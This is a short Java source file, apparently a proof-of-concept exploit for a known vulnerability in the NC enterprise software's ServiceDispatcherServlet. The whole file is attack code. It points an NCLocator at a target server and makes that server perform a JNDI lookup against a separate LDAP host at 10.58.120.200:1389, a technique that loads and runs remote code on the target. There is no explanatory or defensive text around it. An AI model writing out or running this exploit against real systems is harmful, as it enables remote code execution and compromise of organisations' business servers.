package cve.nc;

import nc.bs.framework.common.NCLocator;
import nc.bs.framework.server.ServerNCLocator;

import java.util.Properties;

public class RmiNCLocator_jndi {

    public static void main(String[] args) {

        String url = "http://10.58.120.201/ServiceDispatcherServlet";
        String jndipath = "ldap://10.58.120.200:1389/pppo72";
        Properties env = new Properties();
        env.put("SERVICEDISPATCH_URL", url);

        NCLocator locator = NCLocator.getInstance(env);
        locator.lookup(jndipath);
    }
}
